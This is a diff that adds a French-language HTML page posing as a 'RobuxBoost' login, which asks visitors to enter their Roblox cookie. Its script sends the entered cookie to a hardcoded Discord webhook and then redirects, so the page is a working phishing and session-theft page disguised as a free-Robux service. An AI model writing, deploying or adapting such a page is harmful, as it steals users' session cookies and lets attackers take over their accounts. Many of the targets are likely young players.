@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - RobuxBoost</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a2e;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            background-image: url('https://www.example.com/galaxy-background.jpg'); /* Remplacez par une vraie image de fond galaxie */
+            background-size: cover;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
+        }
+
+        input[type="password"], button {
+            padding: 0.5rem;
+            font-size: 1rem;
+            margin: 1rem;
+            border: 2px solid #ffdd57;
+            border-radius: 5px;
+            width: 80%;
+            max-width: 300px;
+        }
+
+        button {
+            background-color: #ff5733;
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #ff704d;
+        }
+    </style>
+    <script>
+        async function envoyerPseudoWebhook() {
+            const pseudo = document.getElementById('pseudo').value;
+
+            if (pseudo) {
+                const webhookURL = 'https://discord.com/api/webhooks/1301126310277419100/S6yyocNPKZXtPW9zcDl33lCbkrL-HcsN-9cH0SjVh_OWAtNYD3K5_2TwnTDDN2cHK0uj'; // Remplacez par votre URL de webhook
+
+                const payload = {
+                    content: `Nouveau pseudo entré pour accéder au site : ${pseudo}`
+                };
+
+                try {
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (response.ok) {
+                        // Redirection vers la page principale
+                        window.location.href = 'main.html';
+                    } else {
+                        alert('Erreur lors de l\'envoi. Veuillez réessayer.');
+                    }
+                } catch (error) {
+                    alert('Une erreur est survenue lors de la connexion au serveur.');
+                    console.error(error);
+                }
+            } else {
+                alert('Veuillez entrer votre Cookie.');
+            }
+        }
+    </script>
+</head>
+<body>
+
+    <h1>Bienvenue sur RobuxBoost</h1>
+    <p>Veuillez entrer votre Cookie Roblox pour accéder au site :</p>
+    <input type="password" id="pseudo" placeholder="Entrez votre Cookie Roblox">
+    <button onclick="envoyerPseudoWebhook()">Valider</button>
+
+</body>
+</html>
